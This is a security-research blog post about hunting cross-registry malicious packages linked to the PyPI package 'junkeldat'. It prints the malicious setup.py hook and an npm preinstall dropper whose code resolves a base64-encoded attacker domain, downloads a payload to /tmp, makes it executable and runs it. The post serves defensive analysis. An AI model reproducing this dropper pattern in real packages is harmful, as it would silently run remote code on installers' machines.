<div>
<img alt="" class="attachment-large size-large" height="437" src="https://checkmarx.com/wp-content/uploads/2021/06/4-circles-yellow-vert.png" width="87"/>
<img alt="" class="attachment-large size-large" height="616" src="https://checkmarx.com/wp-content/uploads/2022/05/medium-thumbnail-1024x616.png" style="max-width:800px;height:auto;width:auto;" width="1024"/>
<p>Malicious packages in multiple programming languages that went undetected for years were revealed by the Checkmarx Supply Chain Security team using advanced threat hunting techniques.</p>
<p>The fact that the packages stayed undetected for such a long period of time is due at least in part to the lack of information sharing in the ecosystem and to lack of communication between the package managers.</p>
<p>All of the packages in this blog are related to the same attacker and to a malicious package known to the community for several years. Looking at this single package and applying advanced hunting techniques helps us demonstrate that the attacks are not language-specific -- a fact that amplifies the need for cross-industry communication and information sharing.</p>
<h1>Intro</h1>
<p>The open-source community is rapidly growing both in size and importance as individuals and organizations are increasingly reliant on OSS (open source software) to meet business needs within shorter time frames.</p>
<p>Widespread use of open source software has motivated malicious actors to take advantage of the medium, spawning significant and widespread attacks.</p>
<p>As this field of open source security develops, it’s likely a good idea to adopt some practices already instilled in other security fields.</p>
<p>One hunting technique that can be translated to the field of OSS security involves searching for reappearances of various Indications of Compromise (IOC’s) in other places as a sign of malicious activity.</p>
<p>To be able to identify these threats at scale we automated this process and are using multiple data points to try and find relations between known malicious activity and yet-to-be-discovered ones using our hunting engine.</p>
<h1>Hunting engine</h1>
<p>Checkmarx’s Supply Chain Security team is continuously accumulating data from package managers and version control systems such as GitHub and GitLab, among other things, to discover correlations for known threats and uncover new related ones.</p>
<p>In order to find these relations, we track new packages released to numerous package managers and store, among other things, the following details:</p>
<ul><li>Metadata – package name, description, VCS repositories and users, owners’ names, and emails.</li><li>Extracted IOC’s – URL’s, IP’s, cryptocurrency wallets etc.</li></ul>
<p>This data allows us to create clusters based on the relations we find, which many times include relations across several package managers. One of the uses of this is our ability to reveal new suspicious packages through their association to a package that is a known malicious one. The following research illustrates this process perfectly.</p>
<h1>Our Starting point</h1>
<p>During an analysis we performed of one of the more famous datasets of open-source malicious code — the Backstabber’s Knife Collection, we came across a PyPI package called “Junkeldat”</p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-75704" height="899" src="https://checkmarx.com/wp-content/uploads/2022/05/backstabbers.png" style="max-width:800px;height:auto;width:auto;" width="995"/></figure>
<p>The setup.py file of the malicious “junkeldat” package included the following snippet:</p>
<code>class Install(install):
 def run(self):
 ip = socket.gethostbyname(base64.b64decode('d3d3LmRsMDEucHduei5vcmc='))
 self.tesy(ip)
 def test(self, ip):
 print('Testing!')
setup(
 name='junkeldat',
 version='1.0',
 packages=['junkeldat'],
 url='http://pypi.python.org/pypi/junkeldat/',
 description='The junkeldat software',
 cmdclass={
 'install': Install
 }
)
</code>
<p>Putting it simply, this code returns the IP address of a given hostname — in this case, www[.]dl01[.]pwnz[.]org encoded to base64. This package, which had been flagged as malicious back in 2018, was removed from PyPI.</p>
<h1>Hunting around</h1>
<p>The “junkeldat” PyPI package leaves us with a few unique identifiers that can help us hunt for suspicious connected packages:</p>
<ul><li>junkeldat — the package name itself</li><li>www[.]dl01[.]pwnz[.]org</li><li>hxxp://pypi.python[.]org/pypi/junkeldat/ — a URL for the package’s files</li></ul>
<figure class="aligncenter size-large"><img alt="" class="wp-image-75705" height="358" src="https://checkmarx.com/wp-content/uploads/2022/05/hunt-1024x358.png" style="max-width:800px;height:auto;width:auto;" width="1024"/></figure>
<p>These unique strings from one malicious package relates to 3 packages (active at the time of our research), two of them are in other package managers:</p>
<ul><li><a href="https://pypi.org/project/somsomsom/" rel="noreferrer noopener" target="_blank">https://pypi.org/project/somsomsom/</a></li><li><a href="https://rubygems.org/gems/junkeldat" rel="noreferrer noopener" target="_blank">https://rubygems.org/gems/junkeldat</a></li><li><a href="https://www.npmjs.com/package/somsomsom" rel="noreferrer noopener" target="_blank">https://www.npmjs.com/package/somsomsom</a></li></ul>
<p>We decided to dig deeper into all three of them.</p>
<h3>The 3 related packages</h3>
<p>Starting with the <a href="https://pypi.org/project/somsomsom/" rel="noreferrer noopener" target="_blank">somsomsom</a> code package (still available on PyPI today), we found it resembles the “junkeldat” in structure but contains no malicious parts. However, it does have a clear connection to our starting point package: the home page field in the metadata, also directing to hxxp://pypi.python[.]org/pypi/junkeldat/</p>
<p>The second clear connection is to the ruby gem “<a href="https://rubygems.org/gems/junkeldat" rel="noreferrer noopener" target="_blank">junkeldat</a>,” that was non-malicious by itself, and likewise contains the homepage of hxxp://pypi.python[.]org/pypi/junkeldat/</p>
<p>So far, we saw two packages, still available, with clear connections to the original malicious “junkeldat” package. But now, things start to get more interesting.</p>
<h4>The packages within</h4>
<p>As it turns out, NPM has its own version of somsomsom. The package includes a “dist” directory, where we found two tarballs of two other packages.</p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-75706" height="278" src="https://checkmarx.com/wp-content/uploads/2022/05/somsomsom_package_tree.png" width="392"/></figure>
<p>somsomsom package tree</p>
<p>The first (inner) package, somsomsom-1.1.0/package/dist/Junkeldat-1.0.0.tgz, has the same functionality as the original “Junkeldat” package, e.g., a DNS query for www[.]dl01[.]pwnz[.]org, but the other inner package holds much more.</p>
<p>After extracting somsomsom-1.1.0/package/dist/aync-4.15.2.tgz,The package.json file in it includes the following “scripts” section:</p>
<code>{
 "name": "aync",
 "author": {
 "name": "istdogklar",
 "email": "&lt;KlarDoges@yahoo.com&gt;"
 },
 "version": "4.15.2",
 "description": "A stmgcwufpdy bridge to data hashes, with datafile.",
 "homepage": "https://github.com/acdlite/redux-actions",
 "main": "index.js",
 "scripts": {
 "preinstall": "node crambo/endotheliulia.js"
 }
}
</code>
<p>This crambo/endotheliulia.js file, registered as a “preinstall” script, is a dropper that first executes a “run” method. This method also performs a DNS query for the domain 1bed1ef1[.]dl01[.]pwnz[.]org.</p>
<p>This practice allows the attacker flexibility with regards to where they store their payload. If an IP was hardcoded to the code, like we have seen in the <a href="https://checkmarx.com/blog/uaparser-js-attack-preparations/" rel="noreferrer noopener" target="_blank">UAParser.js</a> attack, for example, the attacker would have committed to a specific server address. In this case, as long as they are in control of the domain name, they can move the payload around on different servers and change the DNS records accordingly, without breaking the attack’s flow.</p>
<p>The IP result of this DNS query is then passed on to the function with the revealing name “install_malwar” which does the following:</p>
<p>1. Downloads payload from hxxp://1bed1ef1[.]dl01[.]pwnz[.]org/titleboard</p>
<p>2. Saves the payload as a tmp file — /tmp/simplicitarian</p>
<p>3. Changes its permissions to 777</p>
<p>4. Executes the file</p>
<code>function Aync() {
 this.install_malwar = function(redia) {
 facebar = http.get('http://' + redia + '/titleboard', function(antejentacular) {
 var sanctitude = fs.createWriteStream('/tmp/simplicitarian');
 antejentacular.on('data', function(ringbark) {
 sanctitude.write(ringbark);
 });
 antejentacular.on('end', function() {
 sanctitude.end();
 fs.chmod('/tmp/simplicitarian', '0777');
 child_process.exec('/tmp/simplicitarian', function(err, stdout, stderr) {});
 });
 });
 };
 this.run = function() {
 discounters = 'MWJlZDFlZjEuZGwwMS5wd256Lm9yZw=='
 dns.lookup((new Buffer(discounters, 'base64')).toString(), function(err, indeterminately) {
 this.install_malware(indeterminately);
 });
 };
};
(new Aync()).run();
</code>
<p>Aside from the malicious functionality, which depending on the dropped file can be practically anything, the attacker also used (what seems to be) a misleading tactic to make it harder for analysts to investigate the code, and as a result, waste their time. The rest of the files in the package are organized in a nested directory tree with nonsense file names.</p>
<figure class="aligncenter size-full"><img alt="" class="wp-image-75707" height="750" src="https://checkmarx.com/wp-content/uploads/2022/05/aync_directories_tree.png" width="292"/></figure>
<p>aync directories tree</p>
<p>Each of these files contains one encoded string variable, again possibly to make analysts decode each of these to see what it holds. If not for the pointer to crambo/endotheliulia.js in the package.json file it would have blended right in.</p>
<p>NPM indicates that none of these two packages are currently available on its registry, however, “aync” used to be available on NPM according to libraries.io</p>
<figure class="aligncenter size-large"><img alt="" class="wp-image-75708" height="359" src="https://checkmarx.com/wp-content/uploads/2022/05/post_image_3-2-1024x359.png" style="max-width:800px;height:auto;width:auto;" width="1024"/></figure>
<p>The “somsomsom” package was available on NPM three years after the PyPI package “junkeldat” was submitted to the backstabber’s knife collection and removed from the registry. NPM removed this nested package only recently based on our report to them.</p>
<figure class="aligncenter size-large"><img alt="" class="wp-image-75709" height="439" src="https://checkmarx.com/wp-content/uploads/2022/05/post_image_2-1024x439.png" style="max-width:800px;height:auto;width:auto;" width="1024"/></figure>
<p>Correlation chart of the packages and related unique identifiers</p>
<h1>Conclusion</h1>
<p>Attackers publishing packages in multiple programming languages is a growing concerning trend. The “junkeldat” package group is only one example.</p>
<p>The lack of communication and information sharing inside the open source ecosystem enables these packages to go undetected for long periods of time, We think that a formal central repository of malicious packages containing samples from different programming languages is crucial to detect those attackers and we are working with various parties make this happen and keep the open source ecosystem safe and clean.</p>
</div>